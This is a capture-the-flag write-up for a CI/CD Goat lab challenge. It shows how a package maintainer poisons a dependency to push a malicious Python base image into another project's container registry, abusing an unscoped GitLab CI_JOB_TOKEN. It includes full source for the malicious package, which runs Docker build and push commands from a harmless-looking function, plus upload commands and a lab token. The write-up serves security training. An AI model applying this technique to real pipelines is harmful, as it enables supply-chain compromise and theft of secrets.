[![CICD-SEC-3 Dependency Chain Abuse](https://img.shields.io/badge/CICD--SEC--3-Dependency%20Chain%20Abuse-brightgreen)](https://www.cidersecurity.io/top-10-cicd-security-risks/dependency-chain-abuse/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_100422)


Let's explore what we have when signing in to the compromised GitLab:
You are the maintainer of *pygryphon* package, there are also public projects *nest-of-gold* and *awesome-app* which we have a read-only access.
<BR><BR>
As the instructions of this challenge hint us, let's try to see if we can find any reference to *Flag11*.
  <BR>
A simple search tells us it is being referenced by *nest-of-gold* project 
  <BR><BR><BR>

![grpyhon](../images/gryphon-1.png "grpyhon")

  <BR><BR><BR>
We can see that *Flag11* is used in a pipeline that ships a container used in production.
Let's go to this pipeline scheduling, we can see that user named "gryphon" is the owner of this pipeline, and this user is also the owner of the *awesome-app* project's pipeline.
  
Diving into *awesome-app*, it is using our pygrphon package as a dependency!  
this is what the *requirments.txt* file looks like:
  
 <pre><code>
 
 --extra-index-url http://token:cd79dd622c6d463a574635e874765c0b@gitlab/api/v4/projects/pygryphon%2Fpygryphon/packages/pypi/simple --trusted-host gitlab

pytest==7.2.0
flask==2.0.3
Werkzeug==2.0.3
pygryphon==1.0.13
 
</code></pre> 
  <BR><BR><BR>

This means we can influence *awesome-app* pipeline by uploading a new malicious python package of *pygrphon*.
Our end goal is within *nest-of-gold* project, how can we influence it's pipeline?
  
GitLab has a special setting whether or not a pipeline "CI_JOB_TOKEN" is limited to the specific project or have access to other projects under the same user.
This mean if this setting is disabled, we will be able to interact with *nest-of-gold* project.
<BR><BR><BR>


![grpyhon2](../images/gryphon-2.png "grpyhon2")  
<BR><BR><BR>

  
Because our end goal is to reach the "production" docker produced by *nest-of-gold* pipeline, let's have a look at the Dockerfile inside *nest-of-gold* we can see it is dependent on python:3.8 docker image from nest-of-gold container registry and not the offical registrar.
  
   <pre><code>
 
FROM gitlab:5050/wonderland/nest-of-gold/python:3.8

WORKDIR /app
COPY app.py .
COPY requirements.txt .
RUN pip3 install -r requirements.txt

CMD [ "python3", "-m" , "flask", "run", "--host=0.0.0.0"]

 
</code></pre> 
  
Here's comes the tricky part ðŸ¥¸, let's create a malicious pygryphon package that pushes a malicious python3.8 docker base image to *nest-of-gold* container registry, we are able to do so because the "CI_JOB_TOKEN" is not limited to *awesome-app* project.
In this package let's create a script named "python3" that the docker image of *nest-of-gold* will execute mistakenly instead of the actual python3 interpreter.   
pygryphon package content:
  
 <pre><code>
   import subprocess

DOCKERFILE = """FROM python:3.8
COPY python3 /usr/local/bin/
COPY python3 /usr/local/bin/pip3"""
PYTHON3 = """#!/bin/bash
env | grep FLAG11 || true"""


def run(cmd):
    proc = subprocess.run(cmd, shell=True, timeout=180)
    print(proc.stdout)
    print(proc.stderr)


def hello(name):
    """
    This function greets to
    the person passed in as
    a parameter
    """
    run('apk add docker-cli')
    with open('Dockerfile', 'w') as f:
        f.write(DOCKERFILE)
    with open('python3', 'w') as f:
        f.write(PYTHON3)
    run('chmod +x python3')
    run('DOCKER_HOST=tcp://docker:2375 docker build -t gitlab:5050/wonderland/nest-of-gold/python:3.8 .')
    run('DOCKER_HOST=tcp://docker:2375 docker login -u gryphon -p $TOKEN $CI_REGISTRY')
    run('DOCKER_HOST=tcp://docker:2375 docker push gitlab:5050/wonderland/nest-of-gold/python:3.8')
    return "Hello, " + name

 </code></pre> 
  
And then build and upload this package to gryphon package registry (after we have configured "gitlab" as our a package registry 
  
   <pre><code>
   pipenv run python3 -m build [path_to_package]
   pipenv run python3 -m twine upload -r gitlab
 </code></pre>
